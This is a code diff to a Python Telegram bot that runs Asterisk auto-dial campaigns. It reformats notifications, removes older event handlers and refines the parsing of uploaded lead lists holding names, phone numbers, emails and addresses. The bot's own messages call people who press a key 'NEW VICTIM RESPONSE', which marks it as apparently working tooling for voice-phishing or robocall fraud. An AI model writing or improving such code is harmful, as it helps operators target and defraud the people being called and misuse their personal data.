@@ -160,16 +160,16 @@ async def send_individual_notification(campaign_id: int, notification_type: str,
     
     if notification_type == "dtmf_response":
         message = (
-            f"🎯 **NEW VICTIM RESPONSE**\n\n"
-            f"Campaign #{campaign_id}\n"
+            f"🎯 <b>NEW VICTIM RESPONSE</b>\n\n"
+            f"<b>Campaign #{campaign_id}</b>\n"
             f"📱 {data.get('target_number', 'Unknown')}\n"
             f"🔘 Pressed: {data.get('digit', '?')}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}"
         )
     elif notification_type == "call_completed":
         message = (
-            f"📞 **Call Completed**\n\n"
-            f"Campaign #{campaign_id}\n"
+            f"📞 <b>Call Completed</b>\n\n"
+            f"<b>Campaign #{campaign_id}</b>\n"
             f"📱 {data.get('target_number', 'Unknown')}\n"
             f"⏱ Duration: {data.get('duration', 'Unknown')}\n"
             f"⏰ {datetime.now().strftime('%H:%M:%S')}"
@@ -181,7 +181,7 @@ async def send_individual_notification(campaign_id: int, notification_type: str,
         await global_application_instance.bot.send_message(
             chat_id=user_id,
             text=message,
-            parse_mode='Markdown'
+            parse_mode='HTML'
         )
     except Exception as e:
         logger.error(f"Failed to send individual notification: {e}")
@@ -1519,121 +1519,9 @@ async def post_init(application: Application) -> None:
                 if call_id and call_id in active_calls:
                     update_call_status(call_id, 'dtmf_received')
             
-            # Handle UserEvent
+            # UserEvent handling removed - DTMF events now handled by dedicated dtmf_event_listener
             elif getattr(event, 'name', '') == 'UserEvent':
-                logger.debug(f"Processing UserEvent: {dict(event)}")
-
-                # Check if it's our specific AutoDialResponse event
-                if event.get('UserEvent') == 'AutoDialResponse':
-                    agent_id_str = event.get('AgentID')
-                    caller_id = event.get('CallerID', 'Unknown Caller')
-                    pressed_one = event.get('PressedOne')
-                    campaign_id = event.get('CampaignID', 'unknown')
-
-                    logger.info(f"Processing AutoDialResponse - AgentID: {agent_id_str}, CallerID: {caller_id}, PressedOne: {pressed_one}, CampaignID: {campaign_id}")
-
-                    if pressed_one == 'Yes' and agent_id_str:
-                        try:
-                            agent_id_int = int(agent_id_str)
-                            
-                            # Record the response in the database
-                            async with get_session() as session:
-                                # Look up the campaign if it exists
-                                campaign = None
-                                if campaign_id != 'unknown':
-                                    result = await session.execute(
-                                        select(AutodialCampaign).filter_by(id=int(campaign_id))
-                                    )
-                                    campaign = result.scalar_one_or_none()
-                                
-                                # Create a response record
-                                new_response = AutodialResponse(
-                                    campaign_id=int(campaign_id) if campaign_id != 'unknown' else None,
-                                    phone_number=caller_id,
-                                    response_digit='1',
-                                    timestamp=datetime.utcnow()
-                                )
-                                session.add(new_response)
-                                await session.commit()
-                                logger.info(f"Recorded response from {caller_id} in campaign {campaign_id}")
-                            
-                            # Build enhanced notification with campaign info
-                            campaign_text = f"Campaign: {campaign.name}" if campaign else ""
-                            notification_message = (
-                                f"✅ *New Auto-Dial Response*\n\n"
-                                f"📱 Phone: `{caller_id}`\n"
-                                f"🔘 Response: Pressed 1\n"
-                                f"{campaign_text}"
-                            )
-                            
-                            # Use the application instance passed to post_init
-                            logger.info(f"Attempting to send notification to agent {agent_id_int}")
-                            await application.bot.send_message(
-                                chat_id=agent_id_int, 
-                                text=notification_message, 
-                                parse_mode='Markdown'
-                            )
-                            logger.info(f"Sent notification to agent {agent_id_int} for call from {caller_id}")
-                        except ValueError as ve:
-                            logger.error(f"Value error processing response: {ve}")
-                        except Exception as e:
-                            logger.error(f"Failed to process response or send notification: {e}")
-                    elif pressed_one != 'Yes':
-                        logger.info(f"AutoDialResponse for AgentID {agent_id_str}: Called party did not press 1 (PressedOne: {pressed_one})")
-                
-                # Also handle the KeyPress event (alternative implementation)
-                elif event.headers.get('UserEvent') == 'KeyPress':
-                    number = event.headers.get('Number')
-                    pressed_digit = event.headers.get('Pressed')
-                    campaign_id = event.headers.get('Campaign', 'unknown')
-                    
-                    logger.info(f"Received KeyPress event: Number={number}, Pressed={pressed_digit}, Campaign={campaign_id}")
-                    
-                    if pressed_digit == '1':
-                        try:
-                            # Find the campaign owner
-                            async with get_session() as session:
-                                campaign = None
-                                user_id = None
-                                
-                                if campaign_id != 'unknown':
-                                    result = await session.execute(
-                                        select(AutodialCampaign).filter_by(id=int(campaign_id))
-                                    )
-                                    campaign = result.scalar_one_or_none()
-                                    if campaign:
-                                        user_id = campaign.telegram_user_id
-                                
-                                # Create response record
-                                new_response = AutodialResponse(
-                                    campaign_id=int(campaign_id) if campaign_id != 'unknown' else None,
-                                    phone_number=number,
-                                    response_digit=pressed_digit,
-                                    timestamp=datetime.utcnow()
-                                )
-                                session.add(new_response)
-                                await session.commit()
-                            
-                            # If we found the user, notify them
-                            if user_id:
-                                campaign_text = f"Campaign: {campaign.name}" if campaign else ""
-                                notification_message = (
-                                    f"✅ *New Response*\n\n"
-                                    f"📱 Phone: `{number}`\n"
-                                    f"🔘 Digit: {pressed_digit}\n"
-                                    f"{campaign_text}"
-                                )
-                                
-                                await application.bot.send_message(
-                                    chat_id=user_id,
-                                    text=notification_message,
-                                    parse_mode='Markdown'
-                                )
-                                logger.info(f"Sent KeyPress notification to user {user_id}")
-                        except Exception as e:
-                            logger.error(f"Error processing KeyPress event: {e}")
-                    else:
-                        logger.info(f"KeyPress event: {number} pressed {pressed_digit} (not 1)")
+                logger.debug(f"UserEvent received but ignored - using dedicated DTMF listeners instead")
         
         # Newchannel event listener to map Uniqueid to call_id using database
         async def new_channel_event_listener(manager, event):
@@ -1799,8 +1687,7 @@ async def post_init(application: Application) -> None:
                 logger.debug(f"Ignoring non-autodial channel: {channel} (Context: {context})")
 
 
-        # Register event listeners
-        ami_manager.register_event('UserEvent', ami_event_listener)
+        # Register event listeners (UserEvent removed - using dedicated DTMF listeners)
         ami_manager.register_event('Newchannel', new_channel_event_listener)
         ami_manager.register_event('Newstate', newstate_event_listener)  # SIP state tracking
         ami_manager.register_event('DialBegin', dial_begin_event_listener)  # Dial attempt tracking
@@ -2656,29 +2543,7 @@ async def hangup_event_listener(manager, event):
                                 "duration": f"{call_duration:.0f} seconds",
                                 "cause": cause_txt or 'Unknown'
                             })
-                    else:
-                        # Legacy notification for non-campaign calls
-                        if call.agent_telegram_id and application:
-                            try:
-                                campaign_display = f"{call.campaign_id}" if call.campaign_id else (call.tracking_id or "Unknown")
-                                
-                                notification = (
-                                    f"🔔 *Call Ended*\n\n"
-                                    f"#{campaign_display}\n\n"
-                                    f"• Target: `{call.target_number}`\n"
-                                    f"• Duration: {(call.end_time - call.start_time).total_seconds():.0f} seconds\n"
-                                    f"• Status: Completed\n"
-                                    f"• Hangup Cause: {cause_txt or 'Unknown'}"
-                                )
-                                
-                                await application.bot.send_message(
-                                    chat_id=call.agent_telegram_id,
-                                    text=notification,
-                                    parse_mode='Markdown'
-                                )
-                                logger.info(f"Sent legacy hangup notification to agent {call.agent_telegram_id}")
-                            except Exception as e:
-                                logger.error(f"Failed to send legacy hangup notification: {e}")
+                    # Legacy "Call Ended" notifications removed - campaign system handles all notifications now
                 else:
                     logger.debug(f"No call found in database for Uniqueid: {uniqueid}, Channel: {channel}, CallID: {call_id_from_event}")
     except Exception as e:
@@ -3065,8 +2930,9 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
             if '|' in original_line:
                 # Split by pipe and extract data
                 parts = [part.strip() for part in original_line.split('|')]
+                phone_found = False
                 
-                for part in parts:
+                for i, part in enumerate(parts):
                     # Extract email
                     if '@' in part and not lead_data.get('email'):
                         lead_data['email'] = part
@@ -3079,7 +2945,7 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
                             pass
                     
                     # Extract phone number (look for digits)
-                    elif re.search(r'\d{7,}', part):
+                    elif re.search(r'\d{7,}', part) and not phone_found:
                         # Extract just the digits and normalize
                         digits = re.sub(r'[^0-9]', '', part)
                         if len(digits) >= 10:
@@ -3090,12 +2956,14 @@ async def handle_auto_dial_file(update: Update, context: ContextTypes.DEFAULT_TY
                             elif len(digits) > 11:
                                 # Take the last 10 digits and add +1
                                 phone_number = '+1' + digits[-10:]
-                            break
+                            phone_found = True
                     
-                    # Everything else could be name or address
+                    # Extract name (text without digits, email, or age)
                     elif not lead_data.get('name') and not any(char.isdigit() for char in part) and '@' not in part and not part.lower().startswith('age:'):
                         lead_data['name'] = part
-                    elif not lead_data.get('address') and any(char.isdigit() for char in part):
+                    
+                    # Extract address (anything after phone number that contains digits/address-like content)
+                    elif phone_found and not lead_data.get('address') and (any(char.isdigit() for char in part) or any(word in part.lower() for word in ['st', 'ave', 'rd', 'dr', 'blvd', 'lane', 'way', 'court', 'place'])):
                         lead_data['address'] = part
             else:
                 # Simple phone number format
